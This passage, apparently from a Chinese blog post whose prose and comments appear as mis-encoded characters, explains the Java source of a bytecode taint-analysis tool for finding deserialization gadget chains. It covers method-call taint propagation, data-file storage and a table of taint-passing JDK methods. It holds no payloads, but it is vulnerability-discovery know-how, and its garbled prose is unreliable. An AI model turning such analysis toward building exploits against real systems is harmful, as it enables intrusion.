&#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// å¯¹è±¡ç±»å‹</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦è·å–è¢«è°ƒç”¨æ–¹æ³•çš„è¿”å›å€¼ç±»å‹å¤§å°</span></span><br><span class="line">    <span class="keyword">int</span> retSize = Type.getReturnType(desc).getSize();</span><br><span class="line">    <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    Set&lt;Integer&gt; resultTaint;</span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// è°ƒç”¨å®ä¾‹æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// è°ƒç”¨è¶…ç±»æ„é€ æ–¹æ³•ï¼Œå®ä¾‹åˆå§‹åŒ–æ–¹æ³•ï¼Œç§æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// è°ƒç”¨æ¥å£æ–¹æ³•</span></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿæ“ä½œæ•°æ ˆ</span></span><br><span class="line">            <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> ArrayList&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">            <span class="comment">// è°ƒç”¨æ–¹æ³•å‰å…ˆæŠŠæ“ä½œæ•°å…¥æ ˆ</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                argTaint.add(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è®°å½•æ•°æ®èµ·å§‹ä½ç½®</span></span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                Type argType = argTypes[i];</span><br><span class="line">                <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// æ ¹æ®å‚æ•°ç±»å‹çš„å¤§å°ï¼Œè°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆä¸­çš„å€¼</span></span><br><span class="line">                    <span class="comment">// å‚æ•°ä»å³å¾€å·¦å…¥æ ˆï¼Œè¿™é‡Œå°†å‚æ•°å€¼æ‹·è´åˆ° argTaint</span></span><br><span class="line">                    argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                stackIndex += argType.getSize();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœè¢«è°ƒç”¨çš„æ˜¯æ„é€ æ–¹æ³•ï¼Œåˆ™è®¤ä¸ºè¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æœ¬èº«å¯ä»¥ä¼ é€’æ±¡æŸ“</span></span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                <span class="comment">// parameters</span></span><br><span class="line">                resultTaint = argTaint.get(<span class="number">0</span>);  <span class="comment">// ä»æ ˆé¡¶å–å‡ºå¯¹è±¡ï¼Œå®é™…ä¸Šæ˜¯è¯¥å¯¹è±¡çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultTaint = <span class="keyword">new</span> HashSet&lt;&gt;();  <span class="comment">// å¦åˆ™åˆå§‹åŒ–ä¸ºç©º</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç»è¿‡é€†æ‹“æ‰‘æ’åºï¼Œè°ƒç”¨é“¾æœ«ç«¯çš„æ–¹æ³•å…ˆè¢«è®¿é—®å’Œåˆ¤æ–­ï¼Œå³è¢«è°ƒç”¨æ–¹æ³•å·²ç»è¢«åˆ¤æ–­è¿‡</span></span><br><span class="line">            <span class="comment">// ä¾‹å¦‚ A-&gt;Bï¼Œåˆ¤æ–­ A æ—¶ B å·²ç»æœ‰åˆ¤æ–­ç»“æœäº†ï¼Œå¹¶ä¸”æ­¤æ—¶æ ˆä¸­çš„æ•°æ®æ˜¯è¿™æ ·ï¼šBå¯¹è±¡ Bå‚æ•°</span></span><br><span class="line">            Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc));</span><br><span class="line">            <span class="comment">// å¦‚æœè¢«è°ƒç”¨æ–¹æ³•å­˜åœ¨èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">            <span class="keyword">if</span> (passthrough != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// éå†å‚æ•°ç´¢å¼•</span></span><br><span class="line">                <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                    <span class="comment">// ä»æ ˆä¸­è·å–èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œå…¨éƒ¨æ·»åŠ åˆ° resultTaint</span></span><br><span class="line">                    resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitMethodInsn æ‰§è¡Œå‡º/å…¥æ ˆæ“ä½œï¼Œæ ¹æ®é¢„å®šä¹‰çš„åˆ¤æ–­è§„åˆ™åˆ†æå‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›å€¼ä¸ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// å®ä¾‹å¯¹è±¡æœ¬èº«æœ‰å¯èƒ½ä¼ é€’æ±¡æŸ“ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ ¹æ®è¿”å›å€¼åˆ¤æ–­ï¼ˆå³ä¸èƒ½æœ€å…ˆæ‰§è¡Œè¿™ä¸€å—ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;  <span class="comment">// 1 æˆ–è€… 2</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint å°† resultTaint ä¸­çš„å…ƒç´ åˆå¹¶åˆ°å‚æ•°ç´¢å¼•é›†åˆä¸­</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œå‡ 1 æ˜¯å› ä¸ºåœ¨ TaintTrackingMethodVisitor.visitMethodInsn ä¸­å·²ç»å°†ç¬¬ä¸€ä¸ªå•ä½çš„å€¼è®¾ç½®ä¸ºå…¶åˆ†æå¾—åˆ°çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">        getStackTaint(retSize - <span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å’Œ <code>load</code> æ–¹æ³•ä½¿ç”¨å·¥å‚æ–¹æ³•å®ç°æ•°æ®çš„å­˜å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨å­˜å‚¨æ•°æ®æµä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Save called before discover()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> PassThroughFactory(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» passthrough.dat åŠ è½½æ•°æ®æµä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; load() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry : DataLoader.loadData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> PassThroughFactory())) &#123;</span><br><span class="line">        passthroughDataflow.put(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ•°æ®å·¥å‚æ¥å£å®ç°</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassThroughFactory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">MethodReference</span>.<span class="title">Handle</span>, <span class="title">Set</span>&lt;<span class="title">Integer</span>&gt;&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.Handle clazz = <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(clazz, fields[<span class="number">1</span>], fields[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        Set&lt;Integer&gt; passthroughArgs = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String arg : fields[<span class="number">3</span>].split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arg.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                passthroughArgs.add(Integer.parseInt(arg));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AbstractMap.SimpleEntry&lt;&gt;(method, passthroughArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.getValue().size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = entry.getKey().getClassReference().getName();   <span class="comment">// æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line">        fields[<span class="number">1</span>] = entry.getKey().getName();   <span class="comment">// æ–¹æ³•çš„åç§°</span></span><br><span class="line">        fields[<span class="number">2</span>] = entry.getKey().getDesc();   <span class="comment">// æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (Integer arg : entry.getValue()) &#123;</span><br><span class="line">            sb.append(Integer.toString(arg));</span><br><span class="line">            sb.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fields[<span class="number">3</span>] = sb.toString();  <span class="comment">// å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-TaintTrackingMethodVisitor"><a href="#6-TaintTrackingMethodVisitor" class="headerlink" title="6. TaintTrackingMethodVisitor"></a>6. TaintTrackingMethodVisitor</h2><p>ç»§æ‰¿ asm çš„ MethodVisitorï¼Œæ¨¡æ‹Ÿ JVM å†…å­˜ç»“æ„ï¼Œå³æœ¬åœ°å˜é‡è¡¨ <code>localVars</code> å’Œæ“ä½œæ•°æ ˆ <code>stackVars</code>ï¼›é‡å†™äº†å¤§é‡æ–¹æ³•æ¨¡æ‹Ÿè°ƒç”¨å‚æ•°æ—¶çš„å‡º/å…¥æ ˆæ“ä½œï¼Œç”¨äºè¿›è¡Œæ±¡ç‚¹åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SavedVariableState</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; localVars; <span class="comment">// æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; stackVars; <span class="comment">// æ“ä½œæ•°æ ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SavedVariableState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        localVars = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        stackVars = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SavedVariableState</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.localVars = <span class="keyword">new</span> ArrayList&lt;&gt;(copy.localVars.size());</span><br><span class="line">        <span class="keyword">this</span>.stackVars = <span class="keyword">new</span> ArrayList&lt;&gt;(copy.stackVars.size());</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.localVars) &#123;</span><br><span class="line">            <span class="keyword">this</span>.localVars.add(<span class="keyword">new</span> HashSet&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.stackVars) &#123;</span><br><span class="line">            <span class="keyword">this</span>.stackVars.add(<span class="keyword">new</span> HashSet&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">combine</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; copy.localVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="keyword">this</span>.localVars.size()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.localVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.localVars.get(i).addAll(copy.localVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; copy.stackVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="keyword">this</span>.stackVars.size()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.stackVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.stackVars.get(i).addAll(copy.stackVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢„å®šä¹‰äº†ä¸€äº›æ•°æ®æµä¿¡æ¯ï¼šç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[][] PASSTHROUGH_DATAFLOW = <span class="keyword">new</span> Object[][]&#123;</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Taint from ObjectInputStream. Note that defaultReadObject() is handled differently below</span></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readObject&quot;</span>, <span class="string">&quot;()Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readFields&quot;</span>, <span class="string">&quot;()Ljava/io/ObjectInputStream$GetField;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream$GetField&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class name to returned class</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;()Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class or method name to returned method</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethod&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        <span class="comment">// Pass taint from class to methods</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethods&quot;</span>, <span class="string">&quot;()[Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/StringBuffer;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([B)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([BII)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/io/File;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/nio/paths/Paths&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/net/URL&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼šè¿™é‡Œå®ç°çš„ <code>visitMethodInsn</code> æ¯” PassthroughDataflowMethodVisitor.visitMethodInsn å¤šä¸‰ä¸ªåˆ¤æ–­è§„åˆ™ï¼Œåé¢ CallGraphDiscovery ä¸­çš„ ModelGeneratorMethodVisitor ä¹Ÿé‡å†™äº†è¯¥æ–¹æ³•å¹¶åœ¨æœ€åè°ƒç”¨è¯¥çˆ¶ç±»æ–¹æ³•ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥å‰¥ç¦»å‡ºæ¥ï¼Ÿ</p><ul><li>PassthroughDataflowMethodVisitor ä¸­å­˜å‚¨çš„æ˜¯å‚æ•°ç´¢å¼•ï¼Œè€Œ ModelGeneratorMethodVisitor ä¸­å­˜å‚¨çš„æ˜¯ <code>argå‚æ•°ç´¢å¼•.å­—æ®µåç§°</code></li><li>å‡ºå…¥æ ˆæ“ä½œéƒ½åœ¨ TaintTrackingMethodVisitor ä¸­å®ç°</li><li>ç»è¿‡è¯¥æ–¹æ³•çš„æ¨¡æ‹Ÿï¼Œæ ˆé¡¶å…ƒç´ å³è¯¥æ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</li></ul><p>ä¸¾ä¸ªä¾‹å­çœ‹ä¸€çœ‹å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 